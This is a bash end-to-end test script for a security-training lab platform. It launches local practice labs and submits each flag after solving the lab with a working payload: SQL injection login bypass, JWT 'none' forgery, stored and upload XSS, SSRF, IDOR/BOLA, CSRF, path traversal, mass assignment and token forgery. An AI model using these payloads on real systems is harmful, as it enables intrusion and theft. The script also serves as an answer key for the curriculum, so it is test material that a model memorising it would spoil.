#!/usr/bin/env bash
# Blackbox: Wave 1 curriculum end-to-end. Launch → exploit → submit real flags.
# Usage: ./scripts/blackbox/bb-curriculum.sh [base_url]
# Requires: stack up + lab images built (./scripts/build-lab-images.sh).
set -u
BASE="${1:-http://localhost:8000}"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); echo "PASS: $1"; }
bad() { FAIL=$((FAIL+1)); echo "FAIL: $1${2:+ — $2}"; }
J() { python3 -c "import sys,json;d=json.load(sys.stdin);print($1)"; }

echo "== curriculum blackbox @ $BASE =="
T=$(curl -s -X POST "$BASE/v1/auth/login" -H 'Content-Type: application/json' -d '{"email":"learner@lab.dev"}' | J "d['token']") || T=""
launch() { curl -s -X POST "$BASE/v1/sessions" -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "{\"lab\":\"$1@0.1.0\"}"; }
submit() { curl -s -X POST "$BASE/v1/sessions/$2/submissions" -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "{\"objective_id\":\"$1\",\"flag\":\"$3\"}"; }
destroy() { curl -s -X DELETE "$BASE/v1/sessions/$1" -H "Authorization: Bearer $T" > /dev/null; }

L=$(launch web-http-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "http launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  curl -s "http://127.0.0.1:$P/note?text=HACKED" -H "X-HTTP-Method-Override: POST" > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/flag" | J "d.get('flag','')")
  submit override-note "$S" "$F" | grep -q '"correct":true' && ok "http override → flag accepted" || bad "http solve" "$F"
  destroy "$S"
fi

L=$(launch web-cookies-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "cookies launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  A=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'user':'admin'}).encode()).decode())")
  F=$(curl -s "http://127.0.0.1:$P/admin" -H "Cookie: session=$A" | J "d.get('flag','')")
  submit become-admin "$S" "$F" | grep -q '"correct":true' && ok "cookie forge → flag accepted" || bad "cookies solve" "$F"
  destroy "$S"
fi

L=$(launch web-headers-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "headers launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  F=$(curl -s "http://127.0.0.1:$P/cors/flag" -H "Origin: https://evil.example" -H "Cookie: session=x" | J "d.get('flag','')")
  submit cors-steal "$S" "$F" | grep -q '"correct":true' && ok "CORS steal → flag accepted" || bad "headers solve" "$F"
  destroy "$S"
fi

L=$(launch web-authz-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "authz launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' | J "d['token']")
  curl -s -X POST "http://127.0.0.1:$P/api/users/user/role" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"role":"admin"}' > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/admin/flag" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
  submit escalate-role "$S" "$F" | grep -q '"correct":true' && ok "self-promote → flag accepted" || bad "authz solve" "$F"
  destroy "$S"
fi

L=$(launch web-report-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "report launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  [ "$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://127.0.0.1:$P/findings" -H 'Content-Type: application/json' -d '{"description":"x"}')" = "422" ] && ok "thin finding rejected" || bad "thin finding"
  FULL=$(python3 -c "import json;print(json.dumps({k:f'substantive {k} content here' for k in ['description','evidence','impact','cwe','remediation','retest']}))")
  F=$(curl -s -X POST "http://127.0.0.1:$P/findings" -H 'Content-Type: application/json' -d "$FULL" | J "d.get('flag','')")
  submit write-finding "$S" "$F" | grep -q '"correct":true' && ok "complete finding → flag accepted" || bad "report solve" "$F"
  destroy "$S"
fi

L=$(launch web-idor-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "idor launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"amina","password":"shopper"}' | J "d['token']")
  F=$(curl -s "http://127.0.0.1:$P/orders/102" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
  submit read-other-order "$S" "$F" | grep -q '"correct":true' && ok "IDOR read → flag accepted" || bad "idor solve" "$F"
  destroy "$S"
fi

L=$(launch web-sqli-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "sqli launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  F=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"admin'"'"' -- ","password":"x"}' | J "d.get('flag','')")
  submit sqli-login "$S" "$F" | grep -q '"correct":true' && ok "SQLi bypass → flag accepted" || bad "sqli solve" "$F"
  destroy "$S"
fi

L=$(launch web-xss-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "xss launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  curl -s -X POST "http://127.0.0.1:$P/comments" -H 'Content-Type: application/json' -d '{"text":"<script>BBM</script>"}' > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/flag?marker=BBM" | J "d.get('flag','')")
  submit stored-xss "$S" "$F" | grep -q '"correct":true' && ok "stored XSS → flag accepted" || bad "xss solve" "$F"
  destroy "$S"
fi

L=$(launch web-ssrf-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "ssrf launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  F=$(curl -s "http://127.0.0.1:$P/fetch?url=http://mock-metadata:8081/secret" | J "d.get('flag','')")
  submit fetch-secret "$S" "$F" | grep -q '"correct":true' && ok "SSRF pivot → flag accepted" || bad "ssrf solve" "$F"
  destroy "$S"
fi

L=$(launch api-bola-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "bola launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"alice"}' | J "d['token']")
  F=$(curl -s "http://127.0.0.1:$P/api/v1/invoices/INV-2" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
  submit bola-read "$S" "$F" | grep -q '"correct":true' && ok "BOLA read → flag accepted" || bad "bola solve" "$F"
  destroy "$S"
fi

L=$(launch api-mass-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "mass launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' | J "d['token']")
  curl -s -X PATCH "http://127.0.0.1:$P/api/v1/profile" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"nickname":"x","role":"admin"}' > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/admin/flag" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
  submit mass-assign "$S" "$F" | grep -q '"correct":true' && ok "mass assign → flag accepted" || bad "mass solve" "$F"
  destroy "$S"
fi

L=$(launch api-jwt-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "jwt launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  NONE=$(python3 -c "import base64,json;e=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip('=');print(e({'alg':'none','typ':'JWT'})+'.'+e({'sub':'user','role':'admin'})+'.')")
  F=$(curl -s "http://127.0.0.1:$P/admin/flag" -H "Authorization: Bearer $NONE" | J "d.get('flag','')")
  submit jwt-none "$S" "$F" | grep -q '"correct":true' && ok "JWT none → flag accepted" || bad "jwt solve" "$F"
  destroy "$S"
fi

L=$(launch api-ratelimit-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "ratelimit launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' | J "d['token']")
  F=""
  for _ in 1 2 3 4 5; do F=$(curl -s -X POST "http://127.0.0.1:$P/api/v1/coupons/redeem" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"code":"WELCOME10"}' | J "d.get('flag','')"); done
  submit abuse-redeem "$S" "$F" | grep -q '"correct":true' && ok "coupon abuse → flag accepted" || bad "ratelimit solve" "$F"
  destroy "$S"
fi

L=$(launch web-csrf-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "csrf launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  CK=$(curl -s -D- -o /dev/null -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"victim","password":"victim"}' | grep -i "^set-cookie" | sed 's/.*session=\([^;]*\).*/\1/')
  F=$(curl -s -X POST "http://127.0.0.1:$P/api/transfer" -H "Cookie: session=$CK" -H 'Content-Type: application/json' -d '{"to":"attacker","amount":100}' | J "d.get('flag','')")
  submit csrf-transfer "$S" "$F" | grep -q '"correct":true' && ok "CSRF transfer → flag accepted" || bad "csrf solve" "$F"
  destroy "$S"
fi

L=$(launch web-traversal-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "traversal launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  F=$(curl -s "http://127.0.0.1:$P/files?name=../secret.txt" | J "d.get('flag','')")
  submit traverse-read "$S" "$F" | grep -q '"correct":true' && ok "traversal → flag accepted" || bad "traversal solve" "$F"
  destroy "$S"
fi

L=$(launch web-upload-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "upload launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  SVG=$(python3 -c "import base64;print(base64.b64encode(b'<script>BBM2</script>').decode())")
  curl -s -X POST "http://127.0.0.1:$P/avatar" -H 'Content-Type: application/json' -d "{\"filename\":\"evil.svg\",\"content_b64\":\"$SVG\"}" > /dev/null
  F=$(curl -s "http://127.0.0.1:$P/flag?marker=BBM2" | J "d.get('flag','')")
  submit upload-xss "$S" "$F" | grep -q '"correct":true' && ok "upload XSS → flag accepted" || bad "upload solve" "$F"
  destroy "$S"
fi

L=$(launch web-crypto-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "crypto launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  FORGED=$(python3 -c "import base64,time;print(base64.urlsafe_b64encode(f'admin:{int(time.time())}'.encode()).decode())")
  F=$(curl -s -X POST "http://127.0.0.1:$P/reset/confirm" -H 'Content-Type: application/json' -d "{\"token\":\"$FORGED\",\"new_password\":\"pwned\"}" | J "d.get('flag','')")
  submit forge-reset "$S" "$F" | grep -q '"correct":true' && ok "reset forge → flag accepted" || bad "crypto solve" "$F"
  destroy "$S"
fi

L=$(launch api-graphql-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "graphql launch" "$L"; S=""; }
if [ -n "${S:-}" ]; then
  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"alice"}' | J "d['token']")
  F1=$(curl -s -X POST "http://127.0.0.1:$P/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"query":"query{user(id:\"2\"){id ssn}}"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['user'].get('flag_ssn',''))")
  submit graphql-ssn "$S" "$F1" | grep -q '"correct":true' && ok "GraphQL ssn → flag accepted" || bad "graphql ssn" "$F1"
  DEEP=$(python3 -c "import json;print(json.dumps({'query':'query'+'{user'*6+'(id:\"1\"){id}'+'}'*6}))")
  F2=$(curl -s -X POST "http://127.0.0.1:$P/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d "$DEEP" | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['user'].get('flag_deep',''))")
  submit graphql-deep "$S" "$F2" | grep -q '"correct":true' && ok "GraphQL depth → flag accepted" || bad "graphql deep" "$F2"
  destroy "$S"
fi
echo "== $PASS passed, $FAIL failed =="
[ "$FAIL" = "0" ]
